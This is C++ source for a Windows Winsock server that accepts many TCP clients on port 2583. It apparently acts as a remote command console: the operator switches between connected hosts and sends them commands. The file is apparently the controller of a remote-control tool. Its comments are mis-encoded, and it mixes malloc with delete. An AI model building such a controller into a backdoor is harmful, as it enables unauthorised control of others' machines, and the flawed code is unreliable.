#include <stdio.h>
#include <Winsock2.h> //windows socket��ͷ�ļ�

#include <iostream>

#include "compack.h"
#pragma comment( lib, "ws2_32.lib" )// ����Winsock2.h�ľ�̬���ļ�

using namespace std;

string allhistory = "";
string nowhost = "127.0.0.1";
 
struct threadSockData {
	SOCKET*sock;
	SOCKADDR_IN addr;
};

DWORD WINAPI SevThread(LPVOID cuth) {
	threadSockData *cuthdata =(threadSockData*) cuth;
	char sendBuf[50];
	sprintf(sendBuf, "%s", inet_ntoa(cuthdata->addr.sin_addr));//inet_ntoa�����ַת��ת���ʮ���Ƶ��ַ���ָ��	
	
	char linebuffer[255];
	sprintf(linebuffer,"���ߣ�IP:%s\n", sendBuf);

	teleprintf(linebuffer);
	  
	allhistory += "line :";
	allhistory += 	sendBuf;
	allhistory += "\n";

	char headofCmd[50];
	sprintf(headofCmd, "%s>", sendBuf);
	while (1) {
		//	
		if (strcmp(sendBuf, nowhost.c_str()) != 0) {
			Sleep(100);
			continue;
		}


		teleprintf(headofCmd);

		string comb = "";
		telegetline(comb);


		if (comb == "#plist") {
			teleprintf(allhistory.c_str());
			continue;
		}
		else if (comb == "#tab") {


			teleprintf("����Ҫ�л���IP:");
			string combip = "";
			telegetline( combip);
			nowhost = combip;
			continue;
		}

		if (ReleData(comb, cuthdata->sock) == -1) {
			continue;
		}
		//send(sockConn, comb.c_str(), comb.length(), 0);
		MESSAGEDATA locdata;

		int ret = recv(*cuthdata->sock, (char*)&locdata, sizeof(MESSAGEDATA), 0);

		if (ret == SOCKET_ERROR || ret == 0) {
			teleprintf("�����ж�\n");
			break;
		}
		if (locdata.uId == DATA_REVIEW) {
			string nowDataEx = locdata.data;
			nowDataEx += "\n";

			teleprintf(nowDataEx.c_str());
		}
	}
	closesocket(*cuthdata->sock);
	allhistory += "lineout :";
	allhistory += sendBuf;
	allhistory += "\n";

	nowhost = "127.0.0.1";
	Sleep(2000);//2000����
	delete cuthdata->sock;
	delete cuthdata;
	return 0;
}

DWORD WINAPI FakeThread(LPVOID  lp){
		char sendBuf[255];
		sprintf(sendBuf, "127.0.0.1");//inet_ntoa�����ַת��ת���ʮ���Ƶ��ַ���ָ��	
		allhistory += "line :";
		allhistory += sendBuf;
		allhistory += "\n";
		while (1) {
			//	
			if (strcmp(sendBuf, nowhost.c_str()) != 0) {
				Sleep(100);
				continue;
			}

			char linebuffer[255];

			sprintf(linebuffer, "%s>", sendBuf);
			teleprintf(linebuffer);

			string comb = "";
			telegetline(comb);

			//MessageBoxA(0,comb.c_str(),"",0);

			if (comb == "#plist") {
				teleprintf(allhistory.c_str());
				continue;
			}
			else if (comb == "#tab") {

				//MessageBox(0,L"",L"",0);
				teleprintf("����Ҫ�л���IP:");
				string combip = "";
				telegetline( combip);
				nowhost = combip;
				continue;
			}


		}
		//closesocket(*cuthdata->sock);
		allhistory += "lineout :";
		allhistory += sendBuf;
		allhistory += "\n";
		Sleep(2000);//2000����
	//	delete cuthdata->sock;
		//delete cuthdata;
		return 0;
}
using namespace std;
int main(){
	//��ʼ��winsocket	
	CreateThread(0, 0, AdminLogin, 0, 0, 0);
	WORD wVersionRequested;	
	WSADATA wsaData;
	int err; 	
	wVersionRequested = MAKEWORD( 1, 1 );//��һ������Ϊ��λ�ֽڣ��ڶ�������Ϊ��λ�ֽ� 	
	err = WSAStartup( wVersionRequested, &wsaData );//��winsock DLL����̬���ӿ��ļ������г�ʼ����Э��Winsock�İ汾֧�֣��������Ҫ����Դ��	
	if ( err != 0 )	{		return 0;	} 
	if ( LOBYTE( wsaData.wVersion ) != 1 ||HIBYTE( wsaData.wVersion ) != 1 )//LOBYTE����ȡ��16���������λ��HIBYTE����ȡ��16��������ߣ�����ߣ��Ǹ��ֽڵ�����		
	{		WSACleanup( );		return 0;	} 
	SOCKET sockSrv=socket(AF_INET,SOCK_STREAM,0);//����socket��AF_INET��ʾ��Internet��ͨ�ţ�SOCK_STREAM��ʾsocket�����׽��֣���Ӧtcp��0ָ������Э��ΪTCP/IP
	SOCKADDR_IN addrSrv; 
	addrSrv.sin_addr.S_un.S_addr=htonl(INADDR_ANY);	//htonl�����������ֽ�˳��ת��Ϊ�����ֽ�˳��(to network long)	//INADDR_ANY����ָ����ַΪ0.0.0.0�ĵ�ַ,	//��ʾ��ȷ����ַ,�������ַ������
	addrSrv.sin_family=AF_INET; 	
	addrSrv.sin_port=htons(2583);//htons�����������ֽ�˳��ת��Ϊ�����ֽ�˳��(to network short)
	
	bind(sockSrv,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));//�����ص�ַ�󶨵���������socket�ϣ���ʹ�������ϱ�ʶ��socket 	
	listen(sockSrv,5);//socket������׼�������������� 
	SOCKADDR_IN addrClient;	
	int len=sizeof(SOCKADDR); 	
	CreateThread(0, 0, FakeThread, 0, 0, 0);
	while (1) {
		//teleprintf("�ȴ�����\n");
		SOCKET* sockConn = (SOCKET*)malloc(sizeof(SOCKET));
		*sockConn = accept(sockSrv, (SOCKADDR*)&addrClient, &len);//Ϊһ�����������ṩ����addrClient�����˷�����������Ŀͻ���IP��ַ��Ϣ�����ص���socket������������ÿͻ��������� 
		threadSockData* datath=(threadSockData*)malloc(sizeof(threadSockData));
		datath->addr = addrClient;
		datath->sock = sockConn;

		CreateThread(0, 0, SevThread, datath, 0, 0);
		
		
	}
	WSACleanup();
	return 0;
}